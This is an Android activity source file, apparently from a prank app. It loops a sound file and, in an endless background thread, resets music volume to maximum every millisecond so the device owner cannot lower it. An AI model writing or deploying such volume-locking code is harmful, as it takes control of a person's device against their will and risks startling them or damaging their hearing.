package com.example.lyt;

import android.app.Activity;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.PixelFormat;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.ContextThemeWrapper;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.widget.EditText;
import android.widget.Toast;

public class SNDActivity extends Activity {
    static final int OVERLAY = 0x10004;
    int isPlaying = 0;

    @Override
    protected void onStart() {
        super.onStart();
        if (isPlaying != 0) return;
        isPlaying = 1;

        Toast.makeText(GLB.app(), "音量控制已经开始。", Toast.LENGTH_LONG).show();
        AudioManager ado;
        ado = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
        setContentView(R.layout.content_sndactivity);
        class R extends Thread {
            @Override
            public void run() {
                MediaPlayer m;
                (m = MediaPlayer.create(GLB.app(), com.example.lyt.R.raw.happy)).setLooping(true);
                m.start();
                try {
                    for (; ; ) {
                        ado.setStreamVolume(AudioManager.STREAM_MUSIC, ado.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);
                        findViewById(com.example.lyt.R.id.img).invalidate();
                        Thread.sleep(1);
                    }
                } catch (InterruptedException e) {

                }
            }
        }
        new R().start();
        //findViewById(com.example.lyt.R.id.esc).setOnClickListener(this);
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        //Toast.makeText(this, "" + (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)), Toast.LENGTH_LONG).show();
    }
}
